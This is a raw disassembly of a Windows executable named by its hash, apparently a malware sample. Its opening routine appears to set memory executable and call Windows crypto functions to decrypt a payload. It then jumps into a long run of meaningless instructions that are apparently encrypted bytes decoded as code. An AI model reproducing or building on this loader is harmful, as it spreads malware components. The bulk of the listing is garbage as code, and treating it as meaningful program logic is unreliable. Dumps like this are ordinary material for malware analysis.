
f19d02d53adc5a667b150f949d3ebc1932d8448069767ca79a2344595e628227.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x70
  401006:	mov    DWORD PTR [ebp-0x48],0x0
  40100d:	mov    DWORD PTR [ebp-0x18],0x0
  401014:	mov    DWORD PTR [ebp-0x70],0x0
  40101b:	mov    DWORD PTR [ebp-0x60],0x0
  401022:	mov    DWORD PTR [ebp-0x8],0x0
  401029:	mov    DWORD PTR [ebp-0x6c],0x0
  401030:	mov    DWORD PTR [ebp-0x68],0x0
  401037:	mov    DWORD PTR [ebp-0x14],0x0
  40103e:	mov    DWORD PTR [ebp-0x4c],0x0
  401045:	mov    DWORD PTR [ebp-0x10],0x0
  40104c:	mov    DWORD PTR [ebp-0x58],0x0
  401053:	mov    DWORD PTR [ebp-0x4],0x0
  40105a:	mov    DWORD PTR [ebp-0x5c],0x0
  401061:	mov    DWORD PTR [ebp-0x30],0x0
  401068:	mov    DWORD PTR [ebp-0x54],0x0
  40106f:	mov    DWORD PTR [ebp-0x2c],0x0
  401076:	mov    DWORD PTR [ebp-0x50],0x0
  40107d:	mov    DWORD PTR [ebp-0xc],0x0
  401084:	mov    eax,ds:0x4493e8
  401089:	mov    DWORD PTR [ebp-0x28],eax
  40108c:	mov    ecx,DWORD PTR ds:0x4493ec
  401092:	mov    DWORD PTR [ebp-0x24],ecx
  401095:	mov    edx,DWORD PTR ds:0x4493f0
  40109b:	mov    DWORD PTR [ebp-0x20],edx
  40109e:	mov    al,ds:0x4493f4
  4010a3:	mov    BYTE PTR [ebp-0x1c],al
  4010a6:	mov    ecx,DWORD PTR ds:0x4493f8
  4010ac:	mov    DWORD PTR [ebp-0x40],ecx
  4010af:	mov    edx,DWORD PTR ds:0x4493fc
  4010b5:	mov    DWORD PTR [ebp-0x3c],edx
  4010b8:	mov    eax,ds:0x449400
  4010bd:	mov    DWORD PTR [ebp-0x38],eax
  4010c0:	mov    cx,WORD PTR ds:0x449404
  4010c7:	mov    WORD PTR [ebp-0x34],cx
  4010cb:	mov    dl,BYTE PTR ds:0x449406
  4010d1:	mov    BYTE PTR [ebp-0x32],dl
  4010d4:	mov    DWORD PTR [ebp-0x30],0x40
  4010db:	lea    eax,[ebp-0x40]
  4010de:	push   eax
  4010df:	lea    ecx,[ebp-0x10]
  4010e2:	push   ecx
  4010e3:	call   DWORD PTR ds:0x417004
  4010e9:	test   eax,eax
  4010eb:	je     0x41534a
  4010f1:	push   0x1
  4010f3:	lea    edx,[ebp-0x10]
  4010f6:	push   edx
  4010f7:	call   DWORD PTR ds:0x417008
  4010fd:	lea    eax,[ebp-0x10]
  401100:	push   eax
  401101:	push   0x0
  401103:	push   0x0
  401105:	push   0x1
  401107:	call   DWORD PTR ds:0x41700c
  40110d:	mov    ecx,DWORD PTR [ebp-0x10]
  401110:	add    ecx,0x1
  401113:	mov    DWORD PTR [ebp-0x10],ecx
  401116:	lea    edx,[ebp-0x30]
  401119:	push   edx
  40111a:	lea    eax,[ebp-0x50]
  40111d:	push   eax
  40111e:	push   0x40
  401120:	push   0x7
  401122:	push   0x0
  401124:	mov    ecx,DWORD PTR [ebp-0x50]
  401127:	push   ecx
  401128:	call   DWORD PTR ds:0x417000
  40112e:	lea    edx,[ebp-0x50]
  401131:	push   edx
  401132:	push   0x0
  401134:	push   0x8003
  401139:	mov    eax,DWORD PTR [ebp-0x50]
  40113c:	push   eax
  40113d:	call   DWORD PTR ds:0x417010
  401143:	lea    ecx,[ebp-0x50]
  401146:	push   ecx
  401147:	push   0x0
  401149:	push   0x0
  40114b:	push   0x8003
  401150:	mov    edx,DWORD PTR [ebp-0x50]
  401153:	push   edx
  401154:	call   DWORD PTR ds:0x417018
  40115a:	lea    eax,[ebp-0x50]
  40115d:	push   eax
  40115e:	push   0x0
  401160:	push   0x0
  401162:	push   0x0
  401164:	mov    ecx,DWORD PTR [ebp-0x50]
  401167:	push   ecx
  401168:	call   DWORD PTR ds:0x417014
  40116e:	ds jne 0x401107
  401171:	jmp    0x8183:0x8e0e863d
  401178:	push   ds
  401179:	ds das 
  40117b:	stos   DWORD PTR es:[edi],eax
  40117c:	sar    DWORD PTR [ebx-0x3d],1
  40117f:	jae    0x40115b
  401181:	jle    0x401153
  401183:	adc    eax,DWORD PTR [ecx-0x33]
  401186:	or     ch,BYTE PTR ds:0xddc78188
  40118c:	fcmovu st,st(5)
  40118e:	out    0x71,eax
  401190:	mov    esi,DWORD PTR [eax+ebp*2]
  401193:	jae    0x4011c2
  401195:	and    eax,0xf94b753
  40119a:	inc    edx
  40119b:	push   ebp
  40119c:	mov    esp,0x99f5cead
  4011a1:	add    al,0xbe
  4011a3:	cmp    bh,BYTE PTR fs:[edx-0x3c67b92c]
  4011aa:	adc    dl,BYTE PTR [edi+edx*1+0x3f]
  4011ae:	arpl   WORD PTR [ebx],sp
  4011b0:	cmp    ch,BYTE PTR [esi-0x34e5b013]
  4011b6:	fcmove st,st(6)
  4011b8:	inc    ecx
  4011b9:	mov    cl,0x52
  4011bb:	dec    eax
  4011bc:	pop    bx
  4011be:	dec    esi
  4011bf:	cld    
  4011c0:	add    bl,dh
  4011c2:	fdivr  st(2),st
  4011c4:	leave  
  4011c5:	jbe    0x401153
  4011c7:	xor    al,0x1d
  4011c9:	ins    DWORD PTR es:[edi],dx
  4011ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4011cb:	in     al,0x4d
  4011cd:	(bad)  [ebx+0x5f]
  4011d0:	outs   dx,BYTE PTR ds:[esi]
  4011d1:	les    ebx,FWORD PTR [esi+0x7e2ee29d]
  4011d7:	stos   DWORD PTR es:[edi],eax
  4011d8:	pop    eax
  4011d9:	stc    
  4011da:	jns    0x4011ee
  4011dc:	fdivr  QWORD PTR [ecx+0x2beab557]
  4011e2:	jno    0x401182
  4011e4:	sbb    DWORD PTR [ebx],ebx
  4011e6:	pop    ebx
  4011e7:	test   BYTE PTR [ebp+0x6f],ch
  4011ea:	leave  
  4011eb:	xchg   edx,eax
  4011ec:	pop    esp
  4011ed:	sbb    bh,0xae
  4011f0:	fcmovbe st,st(5)
  4011f2:	jle    0x401179
  4011f4:	in     eax,0xa2
  4011f6:	mov    eax,ds:0x92a60760
  4011fb:	imul   ebx,DWORD PTR [esi-0x6ab3ccc2],0xfffffffd
  401202:	push   esp
  401203:	jmp    0x383b:0xdba5996d
  40120a:	mov    ecx,0xbb06f581
  40120f:	fidiv  WORD PTR [ecx-0xd]
  401212:	pop    edi
  401213:	cli    
  401214:	jns    0x401222
  401216:	jecxz  0x401210
  401218:	mov    bl,0xce
  40121a:	inc    bh
  40121c:	mov    ch,0xb8
  40121e:	ds loop 0x4011e8
  401221:	mov    ch,0x8c
  401223:	in     al,dx
  401224:	fidivr WORD PTR [ebp-0x77a7e1f8]
  40122a:	mov    bh,0x7c
  40122c:	inc    ebx
  40122d:	mov    ds:0xb81ac931,eax
  401232:	mov    dl,0x97
  401234:	and    DWORD PTR [edi-0x5c],edi
  401237:	ins    BYTE PTR es:[edi],dx
  401238:	in     al,0x27
  40123a:	cmp    cl,BYTE PTR [edi+edx*2-0xe151ec6]
  401241:	imul   esp,DWORD PTR [ebp+0x1181e0ae],0xbe45ac5
  40124b:	sbb    dh,BYTE PTR [esi-0x5c80a1f8]
  401251:	or     BYTE PTR [eax],0x3d
  401254:	adc    eax,0x4a735b5c
  401259:	mov    ah,0xe
  40125b:	push   ecx
  40125c:	pop    edx
  40125d:	test   BYTE PTR [esi],bl
  40125f:	loope  0x401220
  401261:	mul    BYTE PTR [esi-0x4c]
  401264:	xor    al,0xf0
  401266:	fdivr  QWORD PTR [esi]
  401268:	cdq    
  401269:	rcl    BYTE PTR ds:0x1df0f27f,0x0
  401270:	pop    ebp
  401271:	repnz push ebp
  401273:	out    dx,eax
  401274:	inc    esp
  401275:	pop    ds
  401276:	retf   
  401277:	or     ch,BYTE PTR [esi]
  401279:	popf   
  40127a:	pop    ebp
  40127b:	sbb    BYTE PTR [ebp+0x1d],0x1d
  40127f:	xchg   ebp,eax
  401280:	jge    0x40126c
  401282:	hlt    
  401283:	push   ds
  401284:	cmp    eax,0x19255f16
  401289:	popf   
  40128a:	xchg   BYTE PTR [ecx+0x15],dl
  40128d:	push   0x873711c1
  401292:	lods   eax,DWORD PTR ds:[esi]
  401293:	test   al,0x9b
  401295:	jl     0x401257
  401297:	mov    eax,0x34de937
  40129c:	push   es
  40129d:	push   cs
  40129e:	jne    0x4012a2
  4012a0:	cwde   
  4012a1:	sub    ebx,esp
  4012a3:	mov    bl,0x1f
  4012a5:	mov    esi,DWORD PTR [edi-0x1f929a02]
  4012ab:	dec    ebx
  4012ac:	jne    0x401281
  4012ae:	pop    esi
  4012af:	cmp    edi,edx
  4012b1:	jg     0x40123e
  4012b3:	cli    
  4012b4:	call   0xc8c8:0x914cd234
  4012bb:	rol    BYTE PTR [esi],1
  4012bd:	imul   edi,DWORD PTR [ecx+0x47],0xffffffb4
  4012c1:	dec    ebp
  4012c2:	int3   
  4012c3:	sub    al,0x4f
  4012c5:	dec    edi
  4012c6:	loop   0x40125e
  4012c8:	pop    ecx
  4012c9:	aam    0xb
  4012cb:	adc    bl,BYTE PTR [ebp+edi*1-0x5c]
  4012cf:	rcr    BYTE PTR [ebx+0x54],cl
  4012d2:	scas   al,BYTE PTR es:[edi]
  4012d3:	fs in  al,dx
  4012d5:	leave  
  4012d6:	in     eax,0xe8
  4012d8:	add    al,0xaf
  4012da:	(bad)  
  4012db:	sbb    dh,BYTE PTR [ebx+0x2a04e22]
  4012e1:	bound  esp,QWORD PTR [ebp+0x580d802f]
  4012e7:	addr16 jne 0x4012c2
  4012ea:	rcr    DWORD PTR ds:[ebx],1
  4012ed:	fwait
  4012ee:	inc    esp
  4012ef:	add    eax,0x572a8819
  4012f4:	test   al,0x0
  4012f6:	in     eax,dx
  4012f7:	pop    esp
  4012f8:	push   ds
  4012f9:	add    esi,DWORD PTR [esi]
  4012fb:	je     0x401343
  4012fd:	rol    edx,1
  4012ff:	in     eax,dx
  401300:	or     DWORD PTR [ecx-0x3b1fef77],ebx
  401306:	or     al,0x46
  401308:	jle    0x4012ca
  40130a:	jbe    0x40137f
  40130c:	outs   dx,DWORD PTR ds:[esi]
  40130d:	ret    0x8cc7
  401310:	stos   BYTE PTR es:[edi],al
  401311:	repnz test al,0x8c
  401314:	int3   
  401315:	jb     0x40138d
  401317:	popw   es
  401319:	imul   edx,DWORD PTR [edx],0xffffffe9
  40131c:	ins    DWORD PTR es:[edi],dx
  40131d:	push   esp
  40131e:	pop    edx
  40131f:	loop   0x4012de
  401321:	call   0xc6c:0x32a7a01f
  401328:	jecxz  0x401396
  40132a:	ja     0x4012c9
  40132c:	sub    eax,0x1671270f
  401331:	in     al,0x7b
  401333:	(bad)  
  401335:	cmp    DWORD PTR ds:0x164e746f,0x1d
  40133c:	adc    dl,BYTE PTR [ebp+eiz*4-0x30419bb2]
  401343:	pop    ebx
  401344:	jno    0x4012ec
  401346:	enter  0x4aaf,0x74
  40134a:	gs mov ah,0x4a
  40134d:	jmp    0xc78a:0xfe95f846
  401354:	xchg   edi,eax
  401355:	lahf   
  401356:	sbb    BYTE PTR [esi+ebp*4+0x67],0x96
  40135b:	push   esi
  40135c:	les    ebx,FWORD PTR [ebx]
  40135e:	jp     0x401342
  401360:	mov    ecx,DWORD PTR [eax]
  401362:	or     DWORD PTR [ecx],esp
  401364:	mov    BYTE PTR [edx+0x72],bh
  401367:	add    cl,BYTE PTR [eax]
  401369:	add    bl,BYTE PTR [ebp+0x1a48e449]
  40136f:	popf   
  401370:	jmp    0x225d:0x9aa5f08d
  401377:	mov    bl,0xf
  401379:	pop    edi
  40137a:	and    BYTE PTR [eax+eiz*1-0x238377a0],ch
  401381:	imul   esp,DWORD PTR [edx-0x24],0xffffffc1
  401385:	data16 mov dl,0x99
  401388:	loope  0x4013b9
  40138a:	and    DWORD PTR [eax],ebx
  40138c:	add    eax,0x6616913
  401391:	hlt    
  401392:	inc    edi
  401393:	cld    
  401394:	adc    ah,BYTE PTR [ebx-0x682653d9]
  40139a:	sub    edx,ebp
  40139c:	xchg   esp,eax
  40139d:	(bad)  
  40139e:	push   ebp
  40139f:	xor    ebp,ecx
  4013a1:	stos   BYTE PTR es:[edi],al
  4013a2:	xchg   ebx,eax
  4013a3:	test   DWORD PTR [ebx-0x79c52db0],ebx
  4013a9:	inc    edi
  4013aa:	jle    0x4013a5
  4013ac:	aaa    
  4013ad:	sbb    edx,DWORD PTR [ebp+0x70cf3a06]
  4013b3:	dec    ebp
  4013b4:	in     al,0xc6
  4013b6:	ficom  DWORD PTR [esi+esi*1]
  4013b9:	dec    ecx
  4013ba:	test   DWORD PTR [edi-0x58fcfa7c],edi
  4013c0:	xchg   BYTE PTR [ecx-0x260ed99e],cl
  4013c6:	pop    edx
  4013c7:	pop    ecx
  4013c8:	shr    BYTE PTR [esi-0x33],cl
  4013cb:	aas    
  4013cc:	cdq    
  4013cd:	pop    esi
  4013ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4013cf:	stos   BYTE PTR es:[edi],al
  4013d0:	les    edx,FWORD PTR [ecx-0x3ef72944]
  4013d6:	fs in  eax,dx
  4013d8:	push   ebx
  4013d9:	fwait
  4013da:	lahf   
  4013db:	push   eax
  4013dc:	push   ebp
  4013dd:	dec    eax
  4013de:	dec    edx
  4013df:	pop    es
  4013e0:	pusha  
  4013e1:	outs   dx,BYTE PTR ds:[esi]
  4013e2:	stos   DWORD PTR es:[edi],eax
  4013e3:	arpl   WORD PTR [edx+edi*1-0x49],cx
  4013e7:	xchg   BYTE PTR [edi+0x3],cl
  4013ea:	add    ch,cl
  4013ec:	inc    edi
  4013ed:	outs   dx,BYTE PTR ds:[esi]
  4013ee:	jp     0x401451
  4013f0:	leave  
  4013f1:	mov    ds:0xac823380,eax
  4013f6:	and    ebx,DWORD PTR [ecx]
  4013f8:	cld    
  4013f9:	sbb    BYTE PTR [esp+edi*4-0x1c9ed936],al
  401400:	shl    BYTE PTR [esi+edi*8+0x4d],1
  401404:	xor    al,0x9
  401406:	pusha  
  401407:	xchg   ebx,eax
  401408:	or     BYTE PTR [ebx-0x65a05d09],ch
  40140e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40140f:	outs   dx,DWORD PTR ds:[esi]
  401410:	pusha  
  401411:	int    0x2e
  401413:	pop    ecx
  401414:	ins    BYTE PTR es:[edi],dx
  401415:	loopne 0x401456
  401417:	fwait
  401418:	push   0xee084f76
  40141d:	adc    esp,DWORD PTR [ecx]
  40141f:	(bad)  
  401420:	in     al,dx
  401421:	dec    ebp
  401422:	mov    BYTE PTR [edx-0xff1af80],bh
  401428:	jo     0x401402
  40142a:	and    BYTE PTR [ecx+ebp*4+0x5a9d9819],bh
  401431:	icebp  
  401432:	push   edx
  401433:	xchg   edi,eax
  401434:	ds nop
  401436:	adc    al,0x30
  401438:	dec    esp
  401439:	popf   
  40143a:	inc    eax
  40143b:	jb     0x40140a
  40143d:	xchg   edi,eax
  40143e:	fmul   DWORD PTR ds:0x97046ea0
  401444:	mov    ch,0x4c
  401446:	jmp    0x57dc565a
  40144b:	(bad)  
  40144c:	repz and al,0xd
  40144f:	jnp    0x4014ba
  401451:	or     bl,dl
  401453:	xor    al,0xe3
  401455:	repnz pop ss
  401457:	aaa    
  401458:	pop    esi
  401459:	cmc    
  40145a:	xor    eax,0xa586ac78
  40145f:	dec    ebp
  401460:	scas   al,BYTE PTR es:[edi]
  401461:	lahf   
  401462:	pop    eax
  401463:	sub    BYTE PTR [esi+0x21],cl
  401466:	dec    esp
  401467:	mov    dh,0xb3
  401469:	nop
  40146a:	xlat   BYTE PTR ds:[ebx]
  40146b:	sub    ebx,eax
  40146d:	aam    0x59
  40146f:	sahf   
  401470:	xlat   BYTE PTR ds:[ebx]
  401471:	pop    ss
  401472:	sti    
  401473:	imul   ebp,DWORD PTR cs:[edi-0x69],0xffffffb4
  401478:	fcomp  DWORD PTR [ebx]
  40147a:	jg     0x401429
  40147c:	aam    0xa9
  40147e:	inc    eax
  40147f:	cli    
  401480:	sbb    eax,0x9122d688
  401485:	and    al,BYTE PTR [edi]
  401487:	idiv   BYTE PTR [edx]
  401489:	js     0x40141d
  40148b:	in     eax,dx
  40148c:	cmp    eax,0xe99b8052
  401491:	popa   
  401492:	push   ds
  401493:	xchg   ecx,eax
  401494:	je     0x40146e
  401496:	inc    edi
  401497:	cdq    
  401498:	neg    BYTE PTR [eax+0xbe44fbd]
  40149e:	or     dh,ah
  4014a0:	jge    0x4014b6
  4014a2:	pop    ecx
  4014a3:	popa   
  4014a4:	jns    0x4014ee
  4014a6:	jge    0x401488
  4014a8:	repz xor eax,0x68621a5d
  4014ae:	inc    eax
  4014af:	fs leave 
  4014b1:	cs in  eax,0x75
  4014b4:	in     eax,dx
  4014b5:	pop    es
  4014b6:	and    BYTE PTR [ebx-0x4a7afed3],dl
  4014bc:	xchg   edx,eax
  4014bd:	jne    0x401523
  4014bf:	dec    esp
  4014c0:	lods   al,BYTE PTR ds:[esi]
  4014c1:	or     eax,DWORD PTR [bp+si+0x60]
  4014c5:	cmp    ah,BYTE PTR [esi-0x50]
  4014c8:	push   ecx
  4014c9:	pop    ecx
  4014ca:	mov    ebp,0x80b89fdd
  4014cf:	dec    ecx
  4014d0:	mov    ds:0xdb4f54d0,al
  4014d5:	push   ebp
  4014d6:	sbb    DWORD PTR ss:[eax],eax
  4014d9:	cmp    DWORD PTR [edx-0x3eceaec9],0xffffff94
  4014e0:	popa   
  4014e1:	jecxz  0x4014df
  4014e3:	mov    eax,0xe073ba3e
  4014e8:	mov    ebx,0xd0e8e0a0
  4014ed:	repz lds esp,FWORD PTR [eax-0x72]
  4014f1:	test   BYTE PTR [edi],al
  4014f3:	jle    0x4014d5
  4014f5:	dec    eax
  4014f6:	jp     0x4014ec
  4014f8:	and    eax,0x667621e7
  4014fd:	ret    0xf0c6
  401500:	and    eax,eax
  401502:	ins    DWORD PTR es:[edi],dx
  401503:	adc    al,0xcf
  401505:	add    dl,BYTE PTR ds:0x721350f7
  40150b:	imul   ecx,DWORD PTR [ebx+0x26],0xd4dd6729
  401512:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401513:	out    dx,al
  401514:	stos   BYTE PTR es:[edi],al
  401515:	and    al,0x85
  401517:	jne    0x40156a
  401519:	jae    0x401574
  40151b:	enter  0xfa10,0x5
  40151f:	cld    
  401520:	repz and eax,0xd7ecfc68
  401526:	pop    eax
  401527:	bound  edx,QWORD PTR [eax]
  401529:	sbb    BYTE PTR gs:[ebx+0x5e],cl
  40152d:	adc    al,ah
  40152f:	or     eax,DWORD PTR [edi]
  401531:	mov    edx,0x75aa95f3
  401536:	pushf  
  401537:	cld    
  401538:	nop
  401539:	or     eax,0xc813c025
  40153e:	les    eax,FWORD PTR [ebx-0x2985780b]
  401544:	loop   0x401583
  401546:	enter  0xd8ad,0x39
  40154a:	add    eax,0xd3176676
  40154f:	js     0x401537
  401551:	xor    bh,bh
  401553:	out    0x4f,eax
  401555:	push   esp
  401556:	cdq    
  401557:	scas   al,BYTE PTR es:[edi]
  401558:	rcr    BYTE PTR [edi-0xfe1dc76],cl
  40155e:	push   ebp
  40155f:	dec    bp
  401561:	or     DWORD PTR [eax-0x4f],ecx
  401564:	sbb    al,0x1f
  401566:	xchg   ebp,eax
  401567:	add    cl,BYTE PTR es:[edx]
  40156a:	in     eax,0x59
  40156c:	lods   eax,DWORD PTR ds:[esi]
  40156d:	inc    ebx
  40156e:	mov    dh,0xce
  401570:	pop    esi
  401571:	ds sbb eax,0xc77f5d07
  401577:	dec    eax
  401578:	xor    eax,0x2a00450f
  40157d:	xor    BYTE PTR [edi],0x84
  401580:	in     eax,0xd3
  401582:	rol    BYTE PTR [ecx-0x63],cl
  401585:	xchg   edi,eax
  401586:	js     0x4015d1
  401588:	pop    esi
  401589:	adc    dl,BYTE PTR [ebp-0x48]
  40158c:	dec    ecx
  40158d:	and    al,BYTE PTR [esi]
  40158f:	sub    BYTE PTR [esi+0x78],dh
  401592:	pushf  
  401593:	into   
  401594:	nop
  401595:	hlt    
  401596:	es gs mov ebx,0xe05eca52
  40159d:	sti    
  40159e:	sub    esi,esi
  4015a0:	and    DWORD PTR [edi+ecx*8+0x1],edx
  4015a4:	gs jns 0x4015d2
  4015a7:	(bad)  
  4015a9:	dec    ecx
  4015aa:	ret    0xec1c
  4015ad:	test   eax,0x18e6be3
  4015b2:	xchg   DWORD PTR [esi-0x7f29e6aa],ebp
  4015b8:	or     BYTE PTR [ebx-0x11],ah
  4015bb:	mov    esp,0xadb84365
  4015c0:	repz and al,dl
  4015c3:	sub    bh,bh
  4015c5:	pop    edx
  4015c6:	sbb    ch,dl
  4015c8:	mov    edi,0xcf27b88a
  4015cd:	add    eax,0x3d90d55b
  4015d2:	push   edx
  4015d3:	push   ds
  4015d4:	mov    edx,0x86cd1b99
  4015d9:	sbb    ecx,edi
  4015db:	mov    al,ds:0x7904dee2
  4015e0:	jmp    0x4015ef
  4015e2:	dec    esp
  4015e3:	mov    esp,0xf83f00fc
  4015e8:	(bad)  
  4015e9:	ret    0xade4
  4015ec:	bound  edi,QWORD PTR [edx]
  4015ee:	inc    eax
  4015ef:	shl    DWORD PTR [edi],0x55
  4015f2:	adc    ecx,ebx
  4015f4:	and    dh,bh
  4015f6:	mov    BYTE PTR ds:0x94d38965,bl
  4015fc:	lods   al,BYTE PTR ds:[esi]
  4015fd:	sub    BYTE PTR [edi-0x14],0x4d
  401601:	xor    esp,DWORD PTR [ebx]
  401603:	pushf  
  401604:	push   edx
  401605:	dec    edx
  401606:	push   ss
  401607:	sti    
  401608:	sub    esp,DWORD PTR [esi+0x57274da0]
  40160e:	mul    DWORD PTR [ecx]
  401610:	mov    ebp,0x87cd9b4b
  401615:	xor    DWORD PTR [ecx+0x5dd5c6aa],eax
  40161b:	loop   0x401664
  40161d:	bound  edi,QWORD PTR [eax-0x18305549]
  401623:	push   esp
  401624:	push   edi
  401625:	adc    al,0xd7
  401627:	iret   
  401628:	adc    edx,DWORD PTR [ecx-0x351bbc74]
  40162e:	out    dx,eax
  40162f:	out    0x69,al
  401631:	imul   eax,eax,0x96bce5d2
  401637:	mov    ebp,0xf8cf68e4
  40163c:	pop    ebp
  40163d:	scas   al,BYTE PTR es:[edi]
  40163e:	jnp    0x401666
  401640:	ret    0x198
  401643:	pop    ds
  401644:	xchg   esi,eax
  401645:	sub    al,0xc
  401647:	retf   
  401648:	pop    es
  401649:	test   DWORD PTR [edi+0x79d79dc1],edx
  40164f:	mov    ecx,0x94e6cb21
  401654:	or     dl,BYTE PTR [ecx-0x72423fd7]
  40165a:	nop
  40165b:	shl    DWORD PTR [ebp+0x5d],1
  40165e:	pop    esi
  40165f:	fwait
  401660:	pushf  
  401661:	das    
  401662:	fdiv   st,st(1)
  401664:	scas   al,BYTE PTR es:[edi]
  401665:	stos   BYTE PTR es:[edi],al
  401666:	sbb    eax,0x1acb1d9d
  40166b:	lock sbb bl,dl
  40166e:	and    ebx,DWORD PTR [esi+0x6]
  401671:	dec    esp
  401672:	dec    ebp
  401673:	adc    DWORD PTR [eax],edx
  401675:	xchg   esi,eax
  401676:	mov    ebx,0xf230a43d
  40167b:	imul   ecx,DWORD PTR [ebx+0x1f],0x22
  40167f:	inc    ebx
  401680:	shl    DWORD PTR [eax+0x71],0x5d
  401684:	and    ch,ch
  401686:	icebp  
  401687:	cmp    al,0xc
  401689:	and    DWORD PTR [esi+0x10],esp
  40168c:	fldcw  WORD PTR [esi-0x15]
  40168f:	xorps  xmm0,XMMWORD PTR [ebx-0x35]
  401693:	dec    edx
  401694:	pop    ebp
  401695:	pop    ebx
  401696:	das    
  401697:	(bad)
  40169b:	mov    eax,ds:0xf34be1aa
  4016a0:	mov    gs,esp
  4016a2:	int    0x13
  4016a4:	dec    esi
  4016a5:	call   0x9ed9fe8e
  4016aa:	xlat   BYTE PTR ds:[ebx]
  4016ab:	stos   BYTE PTR es:[edi],al
  4016ac:	mov    edi,edi
  4016ae:	sbb    al,0xc
  4016b0:	jns    0x40163d
  4016b2:	ficomp WORD PTR [eax]
  4016b4:	mov    esi,0x355d0f2f
  4016b9:	sbb    eax,0x718b9ddf
  4016be:	inc    ebp
  4016bf:	(bad)  
  4016c0:	jle    0x4016af
  4016c2:	xchg   bh,dh
  4016c4:	fidiv  DWORD PTR [ebx+0x7a3e343a]
  4016ca:	mov    dl,0x46
  4016cc:	mov    edi,0x951df344
  4016d1:	repz push 0x2b
  4016d4:	leave  
  4016d5:	sbb    esp,DWORD PTR [esi]
  4016d7:	inc    eax
  4016d8:	mov    ds:0x54b69c9b,eax
  4016dd:	call   0x55f19eaa
  4016e2:	lds    ebp,FWORD PTR [esi-0x5f]
  4016e5:	loopne 0x401741
  4016e7:	xchg   esi,eax
  4016e8:	sub    eax,0xac696416
  4016ed:	inc    ecx
  4016ee:	jle    0x401750
  4016f0:	dec    edi
  4016f1:	and    DWORD PTR [ebp+0xd],0xffffffd6
  4016f5:	jne    0x40167f
  4016f7:	mov    ds:0x8d4b06bf,al
  4016fc:	pop    ss
  4016fd:	(bad)  
  4016fe:	pop    ds
  4016ff:	dec    eax
  401700:	sti    
  401701:	lds    ecx,FWORD PTR [ebp+0x14656d53]
  401707:	jae    0x4016ed
  401709:	(bad)  
  40170a:	or     bh,bh
  40170c:	mov    ecx,?
  40170e:	adc    DWORD PTR [ecx-0x73fd1fca],edx
  401714:	and    ah,bh
  401716:	add    BYTE PTR [edx+edi*8+0x56b41900],cl
  40171d:	and    dh,BYTE PTR [edi-0x50b4e8ca]
  401723:	int3   
  401724:	fistp  DWORD PTR [edx-0x3a]
  401727:	pop    ecx
  401728:	lods   eax,DWORD PTR ds:[esi]
  401729:	pop    ecx
  40172a:	xchg   ebx,eax
  40172b:	jae    0x40173f
  40172d:	dec    ebp
  40172e:	inc    esp
  40172f:	sbb    edi,DWORD PTR [ecx-0x11bbbbc9]
  401735:	xchg   ebp,edx
  401737:	call   0xb45d9bb8
  40173c:	cmp    eax,0xc24b37c4
  401741:	das    
  401742:	or     ecx,0x35cf0e18
  401748:	and    ebp,DWORD PTR [eax-0x75]
  40174b:	cmp    DWORD PTR [ebx+esi*2+0x40541a76],0x1d
  401753:	dec    edi
  401754:	clc    
  401755:	or     al,0xb2
  401757:	das    
  401758:	push   edi
  401759:	out    dx,al
  40175a:	popf   
  40175b:	jns    0x40170e
  40175d:	test   eax,0xdcd90fc2
  401762:	repz sbb dh,ah
  401765:	xor    DWORD PTR [edi-0x5bac4528],edi
  40176b:	mov    ebp,0x2224b031
  401770:	xchg   ebp,eax
  401771:	shl    al,cl
  401773:	ja     0x4017ea
  401775:	and    eax,0xdf7595c9
  40177a:	mov    bh,0x68
  40177c:	jno    0x401797
  40177e:	pop    edx
  40177f:	rcr    BYTE PTR [edx+0x562e0d3d],0x83
  401786:	jo     0x401714
  401788:	test   al,0xd7
  40178a:	out    dx,al
  40178b:	pop    esi
  40178c:	retf   0x747f
  40178f:	dec    ecx
  401790:	std    
  401791:	and    edx,DWORD PTR [edi]
  401793:	aas    
  401794:	fwait
  401795:	addr16 test edx,ecx
  401798:	mov    bl,0x83
  40179a:	data16 shl BYTE PTR [si],cl
  40179e:	popf   
  40179f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4017a0:	cmp    al,0xc2
  4017a2:	push   edi
  4017a3:	add    DWORD PTR [edi],esi
  4017a5:	bound  ebx,QWORD PTR [edi+0x3638236d]
  4017ab:	add    DWORD PTR ds:0x8f7df3d2,ebp
  4017b1:	(bad)  
  4017b2:	xchg   esp,eax
  4017b3:	jecxz  0x40178f
  4017b5:	scas   al,BYTE PTR es:[edi]
  4017b6:	sbb    BYTE PTR [edx+0xa688cd5],bl
  4017bc:	xchg   edi,eax
  4017bd:	lock in al,dx
  4017bf:	or     edx,DWORD PTR [ebp+0x45ec9908]
  4017c5:	sbb    eax,0xf18d958f
  4017ca:	inc    edi
  4017cb:	mov    WORD PTR [ecx-0x46],?
  4017ce:	push   edx
  4017cf:	add    al,0xc8
  4017d1:	jb     0x4017c2
  4017d3:	mov    dl,0x4c
  4017d5:	(bad)  
  4017d9:	(bad)  
  4017da:	ins    BYTE PTR es:[edi],dx
  4017db:	adc    BYTE PTR [edi+0xdb60f28],cl
  4017e1:	int3   
  4017e2:	xor    BYTE PTR [edx+0x28],0xe1
  4017e6:	mov    BYTE PTR [esp+esi*2-0x389fe9c6],bl
  4017ed:	out    0x58,eax
  4017ef:	inc    ebp
  4017f0:	push   edi
  4017f1:	out    0xa6,eax
  4017f3:	mov    WORD PTR [eax],ss
  4017f5:	popf   
  4017f6:	push   ss
  4017f7:	jg     0x40183f
  4017f9:	int3   
  4017fa:	xor    eax,0xcb0f6d37
  4017ff:	xor    eax,0x249a26eb
  401804:	sbb    al,0x42
  401806:	adc    al,0xc7
  401808:	lods   eax,DWORD PTR ds:[esi]
  401809:	mov    dh,0xa4
  40180b:	mov    cl,0x80
  40180d:	mov    ch,BYTE PTR ds:0x7fcf8fda
  401813:	adc    edx,ecx
  401815:	jp     0x4017c9
  401817:	pop    ebx
  401818:	popa   
  401819:	mov    ah,0xf6
  40181b:	dec    ebp
  40181c:	jmp    0xeee0:0x758fc380
  401823:	push   eax
  401824:	push   eax
  401825:	or     DWORD PTR [ebp+0x1fc2dd7f],eax
  40182b:	je     0x401874
  40182d:	lods   eax,DWORD PTR ds:[esi]
  40182e:	mov    edi,0x2a775f06
  401833:	idiv   DWORD PTR [edx-0x2a2973a4]
